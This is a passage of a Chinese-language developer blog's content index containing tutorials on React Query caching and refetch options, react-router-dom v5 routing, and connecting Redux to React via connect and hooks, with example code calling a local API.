&lt;/div&gt; )} React Query vs 傳統 useEffect在學之前可以先看一下前後差異長什麼樣，看完你應該會覺得 React Query 乾淨且直覺很多。 useEffect 版本： 1234567891011121314151617181920212223242526272829303132333435363738import { useState, useEffect } from 'react'import axios from 'axios'export const SuperHeroesPage = () =&gt; { const [isLoading, setIsLoading] = useState(true) const [errorMessage, setErrorMessage] = useState('') const [data, setData] = useState([]) useEffect(() =&gt; { axios .get('http://localhost:4000/superheroes1') .then((res) =&gt; { setData(res.data) setIsLoading(false) }) .catch((error) =&gt; { setErrorMessage(error.message) setIsLoading(false) }) }, []) if (isLoading) { return &lt;h2&gt;Loading...&lt;/h2&gt; } if (errorMessage) { return &lt;h2&gt;{errorMessage}&lt;/h2&gt; } return ( &lt;&gt; &lt;h2&gt;Super Heroes Page&lt;/h2&gt; {data.map((hero) =&gt; { return &lt;div key={hero.id}&gt;{hero.name}&lt;/div&gt; })} &lt;/&gt; )} React Query 版本： 12345678910111213141516171819202122232425import axios from 'axios'import { useQuery } from 'react-query'const getHeros = () =&gt; axios.get('http://localhost:4000/superheroes1')export const RQSuperHeroesPage = () =&gt; { const { isLoading, data, isError, error } = useQuery('super-hero', getHeros) if (isLoading) { return &lt;h2&gt;Loading...&lt;/h2&gt; } if (isError) { return &lt;h2&gt;{error.message}&lt;/h2&gt; } return ( &lt;&gt; &lt;h2&gt;RQ Super Heros Page&lt;/h2&gt; {data?.data.map((hero) =&gt; ( &lt;div key={hero.id}&gt;{hero.name}&lt;/div&gt; ))} &lt;/&gt; )} 可以注意到兩個點： 豪無疑問，行數少了很多。 不用自己處理 loading、error、data 相關的 state。React Query 的 useQuery 會自動在內部管理這些狀態 不知道你心動了嗎，React Query 很香哦～ Cache - cacheTimeReact Query 有快取機制，會把第一次抓到的內容先存起來，並且在下一次需要的時候拿出來用，像這樣： 注意第一次的時候會有 Loading，第二次的時候就沒有了，這個就是快取，目的是為了讓使用者不用每次都要等待讀取的時間。 這時候應該會有一個疑問： 啊我如果 Server 的資料有更新勒？只從快取拿的話不就會是舊資料嗎！ 問的好！React Query 當然有考慮到這一點，所以實際上並不是只有從快取拿資料而已，它還會在背後幫你重新抓一次新的資料。我們可以打開 network 來看就會發現確實是這樣子： 雖然畫面上不會出現 Loading，但可以看到背後還是發了一個請求去抓取最新的資料，並自動更新到畫面上。 React Query 的快取預設會保留五分鐘，如果你不喜歡的話可以透過 config 去改： 1useQuery('super-hero', getHeros, { cacheTime: 5000 }) // 快取保留 5 秒 Cache - staleTime前面有介紹了一點快取機制，我們知道 React Query 會優先拿快取的資料來做顯示，接著在從背景重新抓一次最新資料。到這邊不知道你會不會有一個疑問： 既然都有快取了，有必要每一次都在背景重抓一次嗎？（假設已經知道某些資料不常更新） 如果你有這個困擾的話，staleTime 就是用來解決這個問題的。 我們可以透過 staleTime 來設定一個快取的「新鮮度」有多久？ 原本的預設值是 0，也就是說在我們儲存快取的那一刻起就不新鮮了，因此每一次從快取拿資料時都會從背景去抓取最新的資料。 不太懂的話可以來看個範例，我們把 staleTime 設為 15 秒： 1useQuery('super-hero', getHeros, { staleTime: 15 * 1000 }) // 快取的新鮮度有 15 秒 從圖中可以發現幾件事： 第一次進入頁面時因為還沒有快取，所以會發出一個請求去拿資料，接著再快取起來。 下次再進入同一個頁面時，沒有像前面一樣除了拿快取資料以外，還會在背景去發請求拿出最新的資料，而是先看這個快取是否還新鮮？如果是，就不會再額外發請求去拿資料。 所以我們可以透過這種方式決定多久後該去拿最新的資料，這個就是 staleTime 的用途。 refetchOnWindowFocusReact Query 有一個很厲害的功能是「當你從別的視窗或分頁切回來時，會自動觸發 refetch 的動作」，參考下圖： 能看到每次切回來的時候都會在背景發請求去拿最新的資料。 這個功能叫 refetchOnWindowFocus，預設值為 true。如果不喜歡的話一樣可以透過 config 來設定： 1useQuery('super-hero', getHeros, { refetchOnWindowFocus: false }) // 關閉 refetch 的功能 refetchInterval這個就比較直覺一點了，看到 Interval 應該就能大該猜到是「多久後要自動 refetch」。 這個功能預設是沒有打開的，所以我們要透過 config 來設定： 1useQuery('super-hero', getHeros, { refetchInterval: 1000 }) // 設定為 1 秒 所以現在每過一秒鐘就會去抓一次最新資料： 如果你想做的更徹底一點，讓 user 在不在目前頁面時也會執行 refetch 的話（預設不會），可以加上 refetchIntervalInBackground 這個設定： 1234useQuery('super-hero', getHeros, { refetchInterval: 1000, refetchIntervalInBackground: true // &lt;- 加上這個}) 這樣你的頁面就會變得非常 real time，我覺得在某些情境下可能會很有幫助。 想在事件發生時才去呼叫 API：enabled前面介紹的都是在元件 onMount 的時候自動去呼叫 API 拿資料，不過有些時候我們可能不想在一開始就抓資料，而是在特定事件發生時才去呼叫，例如：按下按鈕的時候。 這個時候可以這樣做： 123const { refetch } = useQuery('super-hero', getHeros, { enabled: false })return &lt;button onClick={refetch}&gt;Fetch Data&lt;/button&gt; 這邊做了兩件事，第一是先把 enabled 設為 false，避免在元件 onMount 時去呼叫 API，接著再把 useQuery 回傳的 refetch 跟按鈕的 onClick 事件做綁定，就可以做出這樣的效果： 能看到現在進入頁面時不會直接去呼叫 API，而是要等到我們「按下按鈕」以後才會去呼叫，完美！ 不過要注意這個方法一樣會保留快取機制（前面有介紹，忘記的話拉回去看），所以如果你的 Loading 狀態是用 isLoading 來控制的話，在按下第二次按鈕時就不會出現 Loading 畫面，因為 isLoading 只會在沒有快取資料的情況下才有機會出現 true。 以這個例子來看的話，在每一次按下按鈕的時候都顯示 Loading 會比較合理，所以我們這時候要拿的 flag 應該要是 isFetching，而不是 isLoading。 12345678910export const RQSuperHeroesPage = () =&gt; { // ✅ if (isFetching) { return &lt;h2&gt;Loading&lt;/h2&gt; } // ❌ if (isLoading) { return &lt;h2&gt;Loading&lt;/h2&gt; }} 只是想提醒一下，注意不要寫錯了！ 注意事項雖然前面說把 enabled 設為 false 的話可以避免 onMount 時去打 API 這件事，但其實它並不單純只是這樣而已，它還會： 取消 refetch 的功能 取消 refetch 的功能 取消 refetch 的功能 也就是說所有跟 refetch 相關的功能都會失效，例如：refetchOnWindowFocus、refetchInterval 等等之類的。 在這種情況下想要做 refetch 的話就只能透過 useQuery 回傳的 refetch 來處理。你必須自己去觸發這個 function 才會觸發 refetch 的行為。 所以這邊想釐清 enabled 的實際用途，也順手留一段官方文件對這個 config 的敘述： Set this to false to disable automatic refetching when the query mounts or changes query keys. To refetch the query, use the refetch method returned from the useQuery instance. Defaults to true. side effect 的好朋友：onSuccess / onError打 API 的時候除了確保我們有拿到資料以外，我們可能還會想做一些 side effect，例如說：錯誤發生時自動導回首頁、列表更新時自動更新滾軸位置等等。 在沒有 React Query 之前你應該都會透過 useEffect 來做這些事，不過現在你可以透過 onSuccess 和 onError 來處理。 來看個例子，我自己還蠻常做的一種 effect 是發生錯誤時自動導回首頁，所以在 React Query 裡可以這樣做： 12345678export const RQSuperHeroesPage = () =&gt; { const history = useHistory() const onError = (error) =&gt; { console.log('error', error) history.push('/') // 導回首頁 } const { isFetching, data, isError, error } = useQuery('super-hero', getHeros, { onSuccess })} 實際效果： 這邊先提醒一下，因為我沒有特別調整設定，所以預設會在失敗後嘗試四次，直到四次都失敗的話才會進入 onError 處理，所以才會看到 console 噴了四次 GET 錯誤。 但總之能看到我們成功運用了 onError 來處理重新導向的 side effect。 最後再提醒一件小事，就是 onSuccess 和 onError 都會自動接收一個參數，所以有需要的話可以拿出來用： 123456const onError = (error) =&gt; { console.log('error', error)}const onSuccess = (data) =&gt; { console.log('data', data)} 後端的資料太髒了，讓我 select 一下這應該是 90% 的前端都會碰到的問題，如果是寫 useEffect 的話你通常會在 setState 以前先把資料整理好在寫進去。 那在 React Query 怎麼做呢？你可以用 select 這個 config 來處理，來看個範例。 假設原本回傳的資料長這樣： 1234567891011121314151617;[ { id: 1, name: 'Batman HoHoHo', alterEgo: 'Bruce Wayne' }, { id: 2, name: 'Superman', alterEgo: 'Clark Kent' }, { id: 3, name: 'Wonder Woman', alterEgo: 'Princess Diana' }] 如果我只需要由 name 組成的 Array，我可以這樣寫： 123456const { data } = useQuery('super-hero', getHeros, { select: (response) =&gt; { const heroNames = response.data.map((hero) =&gt; hero.name) return heroNames }}) 寫成這樣以後 data 值就會變成這邊的 heroNames，而不是原本 axios 的 response。（假設你是用 axios 的話） 你的 key 設對了嗎？抓取 Detail 資料時可能會犯的錯其實這邊主要是想提醒 useQuery 中的 key 的意義，但我覺得這個錯誤應該最常發生在抓 Detail 資料的時候，所以才用這個來當標題。 想像一下你有一個列表，每一個列表點進去以後可以看到細節資訊，那你會怎麼實作 detail 的頁面？應該不外乎都是像這樣吧： 1234567891011121314151617181920212223242526272829303132333435363738394041import axios from 'axios'import React from 'react'import { useQuery } from 'react-query'import { useHistory, useParams } from 'react-router-dom/cjs/react-router-dom.min'export const RQSuperHeroDetail = () =&gt; { // 透過路由資訊取得 id const { id } = useParams() const history = useHistory() const getHeroDetail = () =&gt; axios.get('http://localhost:4000/superheroes/' + id) // 用 useQuery 抓資料 const { data, isLoading, isFetching } = useQuery('super-hero-detail', getHeroDetail, { // 整理資料 select: (response) =&gt; { if (response.data) { return response.data } return null }, // 錯誤處理 onError: (error) =&gt; { history.goBack() } }) if (isLoading) { return &lt;h2&gt;Loading...&lt;/h2&gt; } if (data) { return ( &lt;div&gt; &lt;h2&gt;Id: {data.id}&lt;/h2&gt; &lt;h2&gt;Name: {data.name}&lt;/h2&gt; &lt;h2&gt;Alter Ego: {data.alterEgo}&lt;/h2&gt; &lt;/div&gt; ) } return null} 看起來挺合理的吧？但其實這樣寫會有一個問題，注意這一段： 123useQuery('super-hero-detail', getHeroDetail, { /* 略 */}) 這邊就先直接說了，問題在於 key。不過為什麼呢？我們可以先思考一個問題： /superheroes/1 /superheroes/2 /superheroes/3 … 這幾個 request 拿到的回傳值會相同嗎？當然不會吧！那如果都存同一個 key 會發生什麼事？我們直接來看看： 可以看到第一次點進去的時候會 React Query 會建立一個快取，並且用 [\"super-hero-detail\"] 來當作 key 儲存。接著第二次進去的時候因為也是用同一個 key 來發請求，所以 React Query 就會先從之前的快取中拿資料，再利用背景 refetch 的方式來更新資料。 也因為這樣，才會出現到明明點的是第二個，結果畫面上卻先顯示第一個的資訊，最後才刷新成正確的內容。 這個就是沒正確設定好 key 的話會碰到的問題。我們明明知道每一筆頁面的 detail 資料一定會不一樣，既然如此，怎麼可以拿其他頁面的 detail 資料來用呢？這樣不合理，所以每一個 detail 應該要有自己的獨立的快取才對。 那要怎麼解決呢？其實很簡單，就是幫每個 detail 建立各自的 key 就好了嘛！如果眼睛夠尖的話應該會注意到其實 key 的值是用 Array 來存的，所以我們只要改用陣列的方式來設定就好了，像這樣： 123useQuery(['super-hero-detail', id], getHeroDetail, { /* 略 */}) 這樣子 React Query 就會把每一個不同 id 的請求用不同的 key 來儲存，就不會再出現拿錯快取的問題： 能看到現在每一個 detail 頁面都有自己獨立的 key，所以就不會再出現拿錯快取的問題，只有在進到相同頁面的時候才會（因為相同頁面的 key 會一樣）。 Dynamic Parallel fetch簡單來說，有一種情境是妳想在一個頁面同時發出多個請求，但你又不知道實際上會需要幾個的時候就叫做「Dynamic Parallel fetch」。 如果碰到這種情況的話可以參考 useQueries 這個 hook，雖然我個人更偏好用 Promise.all 來處理這種 case，但還是能認識一下這個 hook。 這邊先直接看 code： 12345678910111213141516171819202122232425import axios from 'axios'import { useQueries } from 'react-query'const getHeroData = (id) =&gt; axios.get('http://localhost:4000/superheroes/' + id)// 假設 props 會接收到一個由 id 組成的陣列export const RQDynamicParallel = ({ ids }) =&gt; { const queryResult = useQueries( ids.map((id) =&gt; { return { queryKey: ['heros', id], queryFn: () =&gt; getHeroData(id), // focus 時不 refetch refetchOnWindowFocus: false, // 整理資料格式 select: (response) =&gt; { if (response.data) { return response.data } } } }) ) return &lt;div&gt;DynamicParallel&lt;/div&gt;} useQueries 只會接收一個參數，這個參數會是一個 Array，裡面的每一個元素都是一個物件。這些物件可以想成是用來代表 useQuery 的內容，所以 key、function、config 等等的設定都會放在這裡面。 至於回傳的結果會是一個 Array 裝著每個 useQuery 的資料，像這樣： 123456789101112131415161718192021222324252627[ { \"status\": \"success\", \"isLoading\": false, \"isSuccess\": true, \"isError\": false, \"isIdle\": false, \"data\": { \"id\": 1, \"name\": \"Batman HoHoHo\", \"alterEgo\": \"Bruce Wayne\" }, \"dataUpdatedAt\": 1688996274677, \"error\": null, \"errorUpdatedAt\": 1688996252855, \"failureCount\": 0, \"isFetched\": true, \"isFetchedAfterMount\": true, \"isFetching\": false, \"isLoadingError\": false, \"isPlaceholderData\": false, \"isPreviousData\": false, \"isRefetchError\": false, \"isStale\": true } // ...略] 常用到的 data、error 等有用的資訊都會儲存裡面，所以就能透過這個來做處理。 有相依性的請求相依性的請求是指假設你有 A、B 兩個 API 要打，但可能 B 需要拿 A 回傳的資料來呼叫，所以你必須等 A 打完後才接著去打 B，這個就叫做相依，因為 B 必須依賴 A。 如果是寫 useEffect 的話我們通常會用 async / await 來處理，例如： 1234567useEffect(() =&gt; { async function callAPI() { const userData = await api.getUserData() // 取得 user 資料 const channelData = await api.getChannel(userData.id) // 拿 id 抓出頻道 } callAPI()}, []) 說實話我覺得這種 case 在 useEffect 的情境下寫起來還蠻直覺的，因為就是單純的 JS 概念而已嘛，不過既然都用套件了就得照套件的規矩來，所以接著來看在 React Query 要怎麼做一樣的事吧！ 在 React Query 的話你必須這樣做： 1234567891011121314151617import axios from 'axios'import { useQuery } from 'react-query'const getUserData = (email) =&gt; axios.get('http://localhost:4000/users/' + email)const getUserChannel = (channelId) =&gt; axios.get('http://localhost:4000/channels/' + channelId)export const RQDependent = ({ email }) =&gt; { // 取得 user 資料 const { data: userData } = useQuery(['email', email], () =&gt; getUserData(email)) const channelId = userData?.data.channelId // 拿 id 抓出頻道 const { data: channelData } = useQuery(['channel', channelId], () =&gt; getUserChannel(channelId), { enabled: Boolean(channelId) // &lt;- 關鍵點 }) return &lt;div&gt;RQDependent&lt;/div&gt;} 其實概念上差不多，只是因為現在是 hook 所以沒辦法寫什麼 async / await，因此得改用 enabled 這個 flag 來處理，流程大概會像下面這樣： 剛進入頁面時，會先打 user 的 API（因為它的 enabled 預設是 true） 拿到 user 資料後，Boolean(channelId) 會從 false 轉成 true 呼叫取得頻道資訊的 API，結束。 所以就是一個用 enabled 來控制什麼時候要發出請求的概念，我覺得相較起來比較沒那麼直覺，但也不失為一種做法就是了！ 不想要一直看到 Loading？也許可以試試 initialData這個情境是這樣子，我們先來看圖說故事： 這是一個從 List 進入 Detail 頁面的示範。在我們還沒有 Cache 之前進入一個 Detail 頁面都必須先 Loading，接著等拿到資料後再顯示畫面。 這時候就有一個想法冒出來了： 如果 List 的資料本身就包含一些 Detail 資訊的話，是不是可以拿來當作 Detail 頁面的初始資料，接著再透過背景 refetch 的方式去更新完整內容就好？這樣就不需要每一次都看到 Loading 了。 答案當然是可以。只是雖然不用等 Loading 是件好事，但我覺得用背景刷新的這種方式在有些情境下可能反而是種反效果，所以用之前還是要想一下是不是真的適合在用會比較好。 要實現這件事很簡單，思路是這樣： 在 Detail 頁面的 useQuery 加上 initialData 的 config 利用 useQueryClient 拿到 List 頁面的快取資料，寫入 initialData 實際的 code 會長這樣： 123456789101112131415161718192021222324252627282930313233343536373839404142import axios from 'axios'import React from 'react'import { useQuery, useQueryClient } from 'react-query'import { useParams } from 'react-router-dom/cjs/react-router-dom.min'const getHeroDetail = (id) =&gt; axios.get('http://localhost:4000/superheroes/' + id)export const RQSuperHeroDetail = () =&gt; { const { id } = useParams() // 拿到 reaact query instance const queryClient = useQueryClient() const { data, isLoading } = useQuery(['super-hero-detail', id], () =&gt; getHeroDetail(id), { // 加上 config initialData: () =&gt; { const queryKeyOfListing = 'super-hero' // 透過 key 去找出對應的快取，再從快取中找出對應的資料 const hero = queryClient.getQueryData(queryKeyOfListing)?.data?.find((hero) =&gt; hero.id === Number(id)) if (hero) { return { data: hero } } return undefined } }) if (isLoading) { return &lt;h2&gt;Loading...&lt;/h2&gt; } if (data.data) { return ( &lt;div&gt; &lt;h2&gt;Id: {data.data.id}&lt;/h2&gt; &lt;h2&gt;Name: {data.data.name}&lt;/h2&gt; &lt;h2&gt;Alter Ego: {data.data.alterEgo}&lt;/h2&gt; &lt;/div&gt; ) } return null} 改寫成這樣後，第一次進入 Detail 頁面時就會先拿 initialData 來顯示，接著再透過背景 refetch 來更新資料，效果會像這樣： 這樣子就不會再有 Loading 畫面了，然後等拿到資料的時候再更新到畫面上。 不過就像一開始說的，有些時候加上必要的 Loading 其實是比較好的，所以我覺得還是要看時機來使用。","link":"/2023/07/11/react-query/"},{"title":"React－react router dom(V5)","text":"回來重溫一下。 簡述雖然之前有學過 v6 的版本，不過還是想來把 v5 給弄清楚一些，以免之後碰到舊專案時會踩到雷。 基本結構在 v6 裡會用 BrowserRouter、Routes 和 Route 來組成，v5 其實也差不多，只是多了 exact 跟 Switch 這兩個東西。 先來看 code： 123456789101112131415161718192021222324import { BrowserRouter, Route, Switch } from \"react-router-dom\"import About from \"./pages/About\";import Contact from \"./pages/Contact\";import Home from \"./pages/Home\";export default function App() { return ( &lt;div className=\"container\"&gt; &lt;BrowserRouter&gt; &lt;Switch&gt; &lt;Route exact path=\"/\"&gt; &lt;Home /&gt; &lt;/Route&gt; &lt;Route path=\"/about\"&gt; &lt;About /&gt; &lt;/Route&gt; &lt;Route path=\"/contact\"&gt; &lt;Contact /&gt; &lt;/Route&gt; &lt;/Switch&gt; &lt;/BrowserRouter&gt; &lt;/div&gt; );} 簡單說明一下： 元件要當作 Route 的 children，不是透過 props Switch 的作用是「只顯示第一個匹配的 path」，否則會全部顯示出來 exact 的作用是「必須一模一樣才算」 這邊解釋一下 exact 的部分，假設沒有加的話，我到 /about 或 /contact 都會匹配到 / 的元件，為什麼？ 你只要用 regex 的「部分匹配」概念來思考就行了，/about 是不是也包含 / 這個路徑？/contact 是不是也一樣？這個就是他的規則。 Nav 與 NavLink要切換不同頁面的話一樣會透過 Link 來做，像這樣： 123456789101112131415161718192021222324252627282930import { BrowserRouter, Route, Switch, Link } from \"react-router-dom\"import About from \"./pages/About\";import Contact from \"./pages/Contact\";import Home from \"./pages/Home\";export default function App() { return ( &lt;div className=\"container\"&gt; &lt;BrowserRouter&gt; &lt;nav&gt; &lt;h1&gt;My articles&lt;/h1&gt; &lt;Link to=\"/\"&gt;Home&lt;/Link&gt; &lt;Link to=\"/about\"&gt;About&lt;/Link&gt; &lt;Link to=\"/contact\"&gt;Contact&lt;/Link&gt; &lt;/nav&gt; &lt;Switch&gt; &lt;Route exact path=\"/\"&gt; &lt;Home /&gt; &lt;/Route&gt; &lt;Route path=\"/about\"&gt; &lt;About /&gt; &lt;/Route&gt; &lt;Route path=\"/contact\"&gt; &lt;Contact /&gt; &lt;/Route&gt; &lt;/Switch&gt; &lt;/BrowserRouter&gt; &lt;/div&gt; );} 這個跟 v6 沒什麼差，比較特別的是 NavLink： 123456789101112131415161718192021222324252627282930import { BrowserRouter, Route, Switch, NavLink } from \"react-router-dom\"import About from \"./pages/About\";import Contact from \"./pages/Contact\";import Home from \"./pages/Home\";export default function App() { return ( &lt;div className=\"container\"&gt; &lt;BrowserRouter&gt; &lt;nav&gt; &lt;h1&gt;My articles&lt;/h1&gt; &lt;NavLink exact to=\"/\"&gt;Home&lt;/NavLink&gt; &lt;NavLink to=\"/about\"&gt;About&lt;/NavLink&gt; &lt;NavLink to=\"/contact\"&gt;Contact&lt;/NavLink&gt; &lt;/nav&gt; &lt;Switch&gt; &lt;Route exact path=\"/\"&gt; &lt;Home /&gt; &lt;/Route&gt; &lt;Route path=\"/about\"&gt; &lt;About /&gt; &lt;/Route&gt; &lt;Route path=\"/contact\"&gt; &lt;Contact /&gt; &lt;/Route&gt; &lt;/Switch&gt; &lt;/BrowserRouter&gt; &lt;/div&gt; );} 這個的用意是，當我在 / 時它會自動幫我在對應的 NavLink 加上 .active 的 class，所以你可以利用這個來處理「目前所在位置」的樣式，就不用再自己寫 expressin 來判斷了。 至於 exact 的用途就跟前面說的一樣，是用來避免「部分匹配」的問題（在 /about 頁面 / 也會被加上 .active）。 useHistory有些時候可能需要手動切換到某路由，在 v6 的時候會用 useNavigate，v5 只是換成 useHistory 而已： 1234567export default function Article() { const history = useHistory() useEffect(() =&gt; { if (!error) return setTimeout(() =&gt; history.push('/'), 2000) }, [error, history])} 關於 404 頁面當使用者到了「不存在的路由」時，可能會希望一律導向至特定的頁面（例如 404），這時候就可以用下面的方式來做： 1234567891011121314151617181920// 使用 Redirect 元件import { Redirect } from \"react-router-dom\"&lt;Switch&gt; &lt;Route exact path=\"/\"&gt; &lt;Home /&gt; &lt;/Route&gt; &lt;Route path=\"/about\"&gt; &lt;About /&gt; &lt;/Route&gt; &lt;Route path=\"/contact\"&gt; &lt;Contact /&gt; &lt;/Route&gt; &lt;Route path=\"/article/:id\"&gt; &lt;Article /&gt; &lt;/Route&gt; // 放在最後一個 &lt;Route path=\"*\"&gt; &lt;Redirect to=\"/\" /&gt; &lt;/Route&gt;&lt;/Switch&gt; 當 React 匹配不到前面的任何一個時，就會套用 * 的路徑，接著再透過 Redirect 導向到我們想要的地方（可以是 404 頁面）。 另外你可能會想說，那如果這樣寫呢？ 123456789101112131415161718&lt;Switch&gt; &lt;Route exact path=\"/\"&gt; &lt;Home /&gt; &lt;/Route&gt; &lt;Route path=\"/about\"&gt; &lt;About /&gt; &lt;/Route&gt; &lt;Route path=\"/contact\"&gt; &lt;Contact /&gt; &lt;/Route&gt; &lt;Route path=\"/article/:id\"&gt; &lt;Article /&gt; &lt;/Route&gt; &lt;Route path=\"*\"&gt; // 直接顯示 Home 元件 &lt;Home /&gt; &lt;/Route&gt;&lt;/Switch&gt; 如果單看畫面的話這樣寫沒問題，可是有一個要注意的地方是「網址不會變」，什麼意思？ 意思是假設我到 /asoqekjwiq 時，雖然會如期顯示 Home 的內容，但網址依舊會停留在 /asoqekjwiq 這個看起來很怪的路徑。可是如果是透過 Redirect 的話，網址就會因為跳轉的關係被更新為 /。 因此從這個結果來看我會覺得 Redirect 是比較合理的選擇。 queryString當我們想取得網址上的 ?name=peanu&amp;age=24 這種 queryString 時，不是透過 path 來建立對應路由，而是透過 useLocation 跟 URLSearchParams 來實作。 直接來看例子： 123456789101112131415161718import React from 'react'import { useLocation } from \"react-router-dom\"export default function Contact() { // 用 search 方法來取得 const queryString = useLocation().search // new 一個用來格式化的 instance const queryParams = new URLSearchParams(queryString) // 透過 getter 取出某個 key 的值 const name = queryParams.get('name') return ( &lt;div&gt; &lt;h2&gt;Hey {name}, Contact us...&lt;/h2&gt; &lt;p&gt;Lorem ipsum, dolor sit amet consectetur adipisicing elit. Eius harum rerum repellat incidunt officiis molestias vitae tempora deserunt deleniti labore optio nobis ipsam odio aliquam, soluta dolorum praesentium aut? Fugit.&lt;/p&gt; &lt;/div&gt; )} 附註：useLocation 是 react-router-dom 提供的 hook，URLSearchParams 是元生 JS 的東西，別搞混了。 其實就這樣子，沒什麼複雜的，但會用到它的時機也許還蠻多的。 路由守衛其實就是一種運用 Redirect 的小技巧，因為這個方式只適用於 V5，所以簡單補充一下。 一般網頁都會有「權限管理機制」，就是說假設我沒登入的話就不能造訪某某頁的這種規則。那這個時候該怎麼寫比較好？參考下面的例子： 1234567891011121314151617181920212223// 儲存在 Context 的 user 資訊（沒登入時會是 null）const { user } = useAuthContext()&lt;BrowserRouter&gt; &lt;Nav /&gt; &lt;Switch&gt; &lt;Route exact path=\"/\"&gt; {user ? &lt;DashBoard /&gt; : &lt;Redirect to=\"/login\" /&gt;} &lt;/Route&gt; &lt;Route path=\"/login\"&gt; {!user ? &lt;Login /&gt; : &lt;Redirect to=\"/\" /&gt;} &lt;/Route&gt; &lt;Route path=\"/signup\"&gt; {!user ? &lt;Signup /&gt; : &lt;Redirect to=\"/\" /&gt;} &lt;/Route&gt; &lt;Route path=\"/create\"&gt; {user ? &lt;Create /&gt; : &lt;Redirect to=\"/login\" /&gt;} &lt;/Route&gt; &lt;Route path=\"/project/:id\"&gt; {user ? &lt;Project /&gt; : &lt;Redirect to=\"/login\" /&gt;} &lt;/Route&gt; &lt;/Switch&gt;&lt;/BrowserRouter&gt; 我只要運用運算來決定要真正要顯示的 Route，就可以做到權限管理的限制。像是 user 如果不存在的話就不能造訪 &lt;DashBoard&gt;，而是會被重新導向到 /login 去。","link":"/2022/06/30/react-react-router-dom-v5/"},{"title":"用 react-redux 把 redux 跟 React 串接起來（Connect 版本）","text":"早期的方法，雖然麻煩但也有一些好處。 簡述用 react redux 串接 redux 的方法有兩種： hook connect 目前都會推薦用 hook 的方式來串，但建議還是能了解一下 connect 的做法是怎麼做的。 正文它背後的原理其實就是「把 store 的東西當作 props 傳到 component 裡面」，我框起來的地方是重點，一定要看懂。 這種作法稱為： HOC Higher Order Component，意思就是 Component 在包一層 Component 總而言之寫起來會長這樣（先看個大概就好，看不懂沒關係）： 1234567891011121314151617181920212223import TodoInput from \"../components/TodoInput\";import { connect } from \"react-redux\";import { addTodo } from \"../redux/actions\";// 這兩個 function 下面會在解釋const mapStateToProps = store =&gt; { return { todos: store.todosReducer.todos }};const mapDispatchToProps = dispatch =&gt; { return { addTodo: payload =&gt; dispatch(addTodo(payload)) }}// 在 connect 傳入兩個 function，拿到 store 裡面的東西const connectToStore = connect(mapStateToProps, mapDispatchToProps);// 把 TodoInput 這個 Component 傳給 connectToStore// 它會產生一個新的 Componentconst connectTodoInput = connectToStore(TodoInput)// 最後把新的 Component 輸出export default connectTodoInput; 在解釋這段 code 以前先打個岔。 還記得剛剛說的嗎？ connect 的原理只是多包一層 Component 而已，所以關於 Component 其實還可以分成下面這兩個東西： dump / presentational Component smart / container Component 那個負責接收 props 的 Component 就叫做 dump component，因為它完全不知道 redux 的存在，它只知道「哦，我會接收到 props，我用就對了」。 而那個負責把 store 傳下去的 Component 就是 smart component，因為它知道 redux 的存在，不像 dump component 純粹只管理 UI 的顯示。 所以這時候呢，資料夾的結構通常會長成這樣子： containers todoInput.js（dump Component） components todoInput.js（smart Component） 雖然只看名字的話感覺是一樣的東西，但它背後卻有著 dump 跟 smart 的區別。 這個想法是 Redux 的作者 Dan Abramov 提出的，有興趣的話推薦去看這篇文章：Presentational and Container Components 好，讓我們回來解釋 code 的部分吧。 首先 connect 只是個用來跟 store 串接起來的函式，它會接收兩個參數（function）： 1. mapStateToProps 12345const mapStateToProps = store =&gt; { return { todos: store.todosReducer.todos }}; 跟 useSelector 是差不多的概念，就是「從 store 把想要的 state 選出來」，然後 return，它就會被當成 Props 傳入（它的函式命名我覺得有夠貼切）。 2. mapDispatchToProps 12345const mapDispatchToProps = dispatch =&gt; { return { addTodo: payload =&gt; dispatch(addTodo(payload)) }} 我是這樣理解啦，你可以先思考這個問題，「現在沒有 useDispatch 能用了，那原本的 Component 要怎麼 dispatch 一個 action？」 剛剛不是有說可以傳 props 嗎？所以只要先在外面這一層把 dispatch 寫好後在當作 props 傳進去就好啦，這就是這一段在做的事情。 順道一提，這邊如果 props 跟 dispatch 的 action 同名，可以用這樣來縮寫： 123const mapDispatchToProps = { addTodo} 做好以後，最後一步就是把 container/ 底下的 Component 引入使用而已。因為 code 有點多我就不貼這邊了，想看完整的原始碼到這邊來看。 最後只是想提一下，這樣子的做法有什麼好處嗎？ 有哦！好處是「測試」比較好測，因為把 Component 都拆成更小的單位了，而且每個 Component 的職責更加分明（負責 UI / 負責 Redux），所以會要測試的項目會單純許多。","link":"/2022/04/24/react-redux-by-connect/"},{"title":"用 react-redux 把 redux 跟 React 串接起來（Hooks 版本）","text":"一個最常見的作法。 簡述雖然說你也可以自己手動把 Redux 跟 React 給串起來，但透過套件來處理會更好。這邊會介紹一套叫做 react-redux 的 library，用它來把 React 跟 Redux 串接起來。 記得，redux 跟 react-redux 是不同的東西： Redux 是管理狀態的 library react-redux 是用來把 React 跟 redux 結合起來的 library 不要再搞混啦！ 要用 react-redux 的方式 有兩種，一種是建立 create-react-app 時加上參數： 1npx create-react-app my-app --template redux 一種是對現有的 create-react-app 來加上 react-redux： 12npm install redux npm install react-redux 我們要介紹的是第二種。 基本的資料夾結構在串接之前記得先做好 redux 前置作業，你的資料夾結構應該會長成這樣： redux reducers todos.js users.js index.js （把所有 reducer 集合起來） store.js（負責建立 store） actionTypes.js（把 action type 的常數集合起來） actions（action creator 管理） selectors（把選出 state 的 function 集合起來） 這邊列出我覺得需要知道一下內容的幾個檔案： 1. reducers/index.js 123456789import { combineReducers } from \"redux\";import todosReducer from \"./todos\"import usersReducer from \"./users\"// 把要 export 出去的 reducer 傳進去export default combineReducers({ todosReducer, usersReducer}) 這邊因為是「多個」reducer，所以資料結構會跟只有「單一個」的時候不太一樣，要多注意一下。 單一個的時候： 12const store = createStore(todosReducer);console.log(store.getState()); output： 123{ todos: ['todo1', 'todo2', 'todo3']} 多個的時候： 12const store = createStore(todosReducer);console.log(store.getState()); output： 12345678{ todosReducer: { todos: ['todo1', 'todo2'] }, usersReducer: { users: ['user1', 'user2'] }} 2. redux/store.js 12345import { createStore } from \"redux\";import rootReducer from \"./reducers\";// 把 reducer 丟進去 create 一個 storeexport default createStore(rootReducer); 3. redux/selectors.js 這邊做個補充，selector 的用途只是「把我想要的 state 選出來」而已，畢竟你應該不會想在一個 Component 裡面拿到所有的 state，所以才會衍伸出這個東西。 另外之所以會抽出去建立成 constant 只是因為 code 寫起來會比較簡潔而已。 123// 兩個 functionexport const selectTodos = state =&gt; state.todosReducer.todos;export const selectUsers = state =&gt; state.usersReducer.users; 其他的就只是把原本的東西抽出去寫成一個檔案而已，忘記的話可以參考：初探 Redux 正式串接這邊寫個懶人包： 定義 Provider 把 store 傳入 